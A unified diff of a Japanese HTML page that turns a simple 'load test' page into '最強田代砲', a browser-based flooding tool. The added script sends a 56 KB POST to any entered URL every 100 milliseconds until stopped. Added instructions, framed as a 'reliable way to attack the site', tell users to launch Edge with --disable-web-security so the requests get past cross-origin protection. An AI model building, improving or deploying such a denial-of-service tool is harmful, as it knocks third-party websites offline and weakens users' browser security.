@@ -3,11 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>負荷テストサイト</title>
+    <title>最強田代砲</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 20px;
+            background-color: black; /* 背景色を黒に設定 */
+            color: white; /* 字の色を白に設定 */
         }
         input, button {
             margin: 5px;
@@ -15,25 +17,39 @@
         #results {
             margin-top: 20px;
         }
+        pre {
+            background-color: #222; /* コードブロックの背景 */
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto; /* 横スクロール */
+        }
     </style>
 </head>
 <body>
-    <h1>シンプル田代砲</h1>
+    <h1>超 田代砲</h1>
     <label for="url">テストするURL:</label>
-    <input type="text" id="url" placeholder="https://example.com">
-    <p></p>
-    <label for="requestCount">リクエスト数:</label>
-    <input type="number" id="requestCount" value="100" min="1">
+    <input type="text" id="url" placeholder="example.com">
     
-    <button id="startTest">負荷テスト開始</button>
+    <button id="startTest">発射</button>
+    <button id="stopTest" disabled>停止</button>
     
     <div id="results"></div>
-
+    
+    <p>確実にそのサイトに攻撃する方法</p>
+    <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
+    <p>2. cmdと入力して検索する。</p>
+    <p>3. コマンドプロンプトが開く。下記のコードをコピペして実行する。</p>
+    
+    <pre id="commandText">
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp
+    </pre>
     <script>
+        let intervalId;
+        let isRunning = false;
+
         document.getElementById('startTest').addEventListener('click', function() {
-            let requestCount = parseInt(document.getElementById('requestCount').value);
-            let url = document.getElementById('url').value;
-            let resultsDiv = document.getElementById('results');
+            const url = document.getElementById('url').value;
+            const resultsDiv = document.getElementById('results');
             resultsDiv.innerHTML = ''; // 結果をクリア
 
             if (!url) {
@@ -41,37 +57,42 @@
                 return;
             }
 
-            let startTime = performance.now();
-            let promises = [];
+            const sendData = new Array(56000).fill('A').join(''); // 56000バイトのデータを作成
+            isRunning = true;
 
-            for (let i = 0; i < requestCount; i++) {
-                promises.push(sendRequest(url));
-            }
+            document.getElementById('startTest').disabled = true; // 発射ボタンを無効化
+            document.getElementById('stopTest').disabled = false; // 停止ボタンを有効化
 
-            Promise.all(promises).then((responses) => {
-                let endTime = performance.now();
-                let duration = endTime - startTime;
-                resultsDiv.innerHTML = `<p>${requestCount} 件のリクエストを送信しました。所要時間: ${duration.toFixed(2)} ms</p>`;
-            }).catch(err => {
-                resultsDiv.innerHTML = `<p>エラー: ${err}</p>`;
-            });
+            // 定期的にリクエストを送信
+            intervalId = setInterval(() => {
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ data: sendData })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                });
+            }, 100); // 100ミリ秒ごとにリクエストを送信
         });
 
-        function sendRequest(url) {
-            return new Promise((resolve, reject) => {
-                fetch(url, { method: 'GET' })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Network response was not ok');
-                        }
-                        resolve(response);
-                    })
-                    .catch(err => reject(err));
-            });
-        }
+        document.getElementById('stopTest').addEventListener('click', function() {
+            clearInterval(intervalId); // インターバルをクリア
+            isRunning = false;
+
+            document.getElementById('startTest').disabled = false; // 発射ボタンを再有効化
+            document.getElementById('stopTest').disabled = true; // 停止ボタンを無効化
+
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML += '<p>テストが停止しました。</p>'; // 停止メッセージを表示
+        });
     </script>
 </body>
-    <p>簡易的な田代砲を作ってみました</p>
-    <p>シンプルだから意外と使いやすいかも</p>
-    <p>バグがあったらごめんなさい</p>
 </html>
